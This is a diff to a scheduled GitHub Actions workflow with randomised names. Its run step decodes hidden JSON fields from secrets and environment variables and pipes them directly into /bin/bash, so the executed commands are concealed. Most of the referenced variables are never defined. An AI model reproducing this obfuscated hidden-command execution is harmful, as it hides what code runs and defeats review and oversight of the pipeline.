@@ -2,8 +2,7 @@ name: gaoqianyu5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
-
+    - cron: '30 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaoqianyu5647
         env:
-          ahmty92922: ${{ secrets.ahmty92922 }}
+          e981: ${{ secrets.e981 }}
         run: |
-          echo $ahmty92922 | jq -r .ook65 | /bin/bash
-          echo $jcs20 | jq -r .l07 | /bin/bash
-          echo $r7 | jq -r .ijyat456 | /bin/bash
-          echo $kyqef0181 | jq -r .d7 | /bin/bash
-          echo $fffv5770 | jq -r .pc983 | /bin/bash
-          echo $r211 | jq -r .rteb269 | /bin/bash
-          echo $jiu2 | jq -r .twbo10981 | /bin/bash
-          echo $vjux4895 | jq -r .zfmif5 | /bin/bash
-          echo $aa930 | jq -r .glbi53 | /bin/bash
-          echo $yddv61 | jq -r .b31 | /bin/bash
-          echo $crrf09 | jq -r .ypbim348 | /bin/bash
-          echo $sp69 | jq -r .cx2700 | /bin/bash
-          echo $jwnxj6 | jq -r .rigtx71 | /bin/bash
-          echo $x7 | jq -r .vq1 | /bin/bash
-          echo $o20604 | jq -r .fkdf97 | /bin/bash
-          echo $z80120 | jq -r .l5287 | /bin/bash
-          echo $g1506 | jq -r .aet20835 | /bin/bash
-          echo $glqu1 | jq -r .se4378 | /bin/bash
+          echo $e981 | jq -r .jrlle6 | /bin/bash
+          echo $o04523 | jq -r .mrc42303 | /bin/bash
+          echo $yhrm0417 | jq -r .mfg1832 | /bin/bash
+          echo $by1594 | jq -r .h2 | /bin/bash
+          echo $xeldg439 | jq -r .ordzk393 | /bin/bash
+          echo $fhlg26535 | jq -r .tmuzt1 | /bin/bash
+          echo $q11 | jq -r .ou31 | /bin/bash
+          echo $zhitj586 | jq -r .pmyn92015 | /bin/bash
 
